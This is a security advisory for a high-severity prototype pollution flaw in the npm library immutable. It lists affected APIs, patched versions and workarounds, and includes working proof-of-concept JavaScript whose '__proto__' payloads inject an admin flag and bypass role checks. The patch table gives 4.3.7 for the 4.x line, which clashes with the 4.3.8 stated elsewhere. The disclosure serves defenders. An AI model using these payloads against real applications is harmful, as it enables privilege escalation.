# [H] Immutable is vulnerable to Prototype Pollution

## Summary
Severity: High
Advisory: GHSA-wf6x-7x77-mvgw
CVE: CVE-2026-29063
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-04
Source: https://github.com/advisories/GHSA-wf6x-7x77-mvgw
Type: github-advisory

## Affected
- npm: `immutable` — affected >=4.0.0-rc.1 <4.3.8
- npm: `immutable` — affected >=5.0.0 <5.1.5
- npm: `immutable` — affected >=0 <3.8.3

## Details
## Impact
_What kind of vulnerability is it? Who is impacted?_

A Prototype Pollution is possible in immutable via the mergeDeep(), mergeDeepWith(), merge(), Map.toJS(), and Map.toObject() APIs.

## Affected APIs

| API                                     | Notes                                                       |
| --------------------------------------- | ----------------------------------------------------------- |
| `mergeDeep(target, source)`              | Iterates source keys via `ObjectSeq`, assigns `merged[key]` |
| `mergeDeepWith(merger, target, source)`  | Same code path                                              |
| `merge(target, source)`                    | Shallow variant, same assignment logic                      |
| `Map.toJS()`                              | `object[k] = v` in `toObject()` with no `__proto__` guard   |
| `Map.toObject()`                            | Same `toObject()` implementation                            |
| `Map.mergeDeep(source)`                  | When source is converted to plain object                    |



## Patches
_Has the problem been patched? What versions should users upgrade to?_

| major version | patched version |
| --- | --- |
| 3.x | 3.8.3 |
| 4.x | 4.3.7 |
| 5.x | 5.1.5 |

## Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

- [Validate user input](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#validate_user_input)
- [Node.js flag --disable-proto](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#node.js_flag_--disable-proto)
- [Lock down built-in objects](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#lock_down_built-in_objects)
- [Avoid lookups on the prototype](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#avoid_lookups_on_the_prototype)
- [Create JavaScript objects with null prototype](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution#create_javascript_objects_with_null_prototype)

## Proof of Concept

### PoC 1 — mergeDeep privilege escalation

```javascript
"use strict";
const { mergeDeep } = require("immutable"); // v5.1.4

// Simulates: app merges HTTP request body (JSON) into user profile
const userProfile = { id: 1, name: "Alice", role: "user" };
const requestBody = JSON.parse(
  '{"name":"Eve","__proto__":{"role":"admin","admin":true}}',
);

const merged = mergeDeep(userProfile, requestBody);

console.log("merged.name:", merged.name); // Eve   (updated correctly)
console.log("merged.role:", merged.role); // user  (own property wins)
console.log("merged.admin:", merged.admin); // true  ← INJECTED via __proto__!

// Common security checks — both bypassed:
const isAdminByFlag = (u) => u.admin === true;
const isAdminByRole = (u) => u.role === "admin";
console.log("isAdminByFlag:", isAdminByFlag(merged)); // true  ← BYPASSED!
console.log("isAdminByRole:", isAdminByRole(merged)); // false (own role=user wins)

// Stealthy: Object.keys() hides 'admin'
console.log("Object.keys:", Object.keys(merged)); // ['id', 'name', 'role']
// But property lookup reveals it:
console.log("merged.admin:", merged.admin); // true
```

### PoC 2 — All affected APIs

```javascript
"use strict";
const { mergeDeep, mergeDeepWith, merge, Map } = require("immutable");

const payload = JSON.parse('{"__proto__":{"admin":true,"role":"superadmin"}}');

// 1. mergeDeep
const r1 = mergeDeep({ user: "alice" }, payload);
console.log("mergeDeep admin:", r1.admin); // true

// 2. mergeDeepWith
const r2 = mergeDeepWith((a, b) => b, { user: "alice" }, payload);
console.log("mergeDeepWith admin:", r2.admin); // true

// 3. merge
const r3 = merge({ user: "alice" }, payload);
console.log("merge admin:", r3.admin); // true

// 4. Map.toJS() with __proto__ key
const m = Map({ user: "alice" }).set("__proto__", { admin: true });
const r4 = m.toJS();
console.log("toJS admin:", r4.admin); // true

// 5. Map.toObject() with __proto__ key
const m2 = Map({ user: "alice" }).set("__proto__", { admin: true });
const r5 = m2.toObject();
console.log("toObject admin:", r5.admin); // true

// 6. Nested path
const nested = JSON.parse('{"profile":{"__proto__":{"admin":true}}}');
const r6 = mergeDeep({ profile: { bio: "Hello" } }, nested);
console.log("nested admin:", r6.profile.admin); // true

// 7. Confirm NOT global
console.log("({}).admin:", {}.admin); // undefined (global safe)
```

**Verified output against immutable@5.1.4:**

```
mergeDeep admin: true
mergeDeepWith admin: true
merge admin: true
toJS admin: true
toObject admin: true
nested admin: true
({}).admin: undefined  ← global Object.prototype NOT polluted
```


## References
_Are there any links users can visit to find out more?_

- [JavaScript prototype pollution](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Prototype_pollution)

## References
- https://github.com/immutable-js/immutable-js/security/advisories/GHSA-wf6x-7x77-mvgw
- https://nvd.nist.gov/vuln/detail/CVE-2026-29063
- https://github.com/immutable-js/immutable-js/issues/2178
- https://github.com/immutable-js/immutable-js/commit/16b3313fdf2c5f579f10799e22869f6909abf945
- https://github.com/immutable-js/immutable-js/commit/6e2cf1cfe6137e72dfa48fc2cfa8f4d399d113f9
- https://github.com/immutable-js/immutable-js/commit/6ed4eb626906df788b08019061b292b90bc718cb
- https://github.com/immutable-js/immutable-js
- https://github.com/immutable-js/immutable-js/releases/tag/v3.8.3
- https://github.com/immutable-js/immutable-js/releases/tag/v4.3.8
- https://github.com/immutable-js/immutable-js/releases/tag/v5.1.5
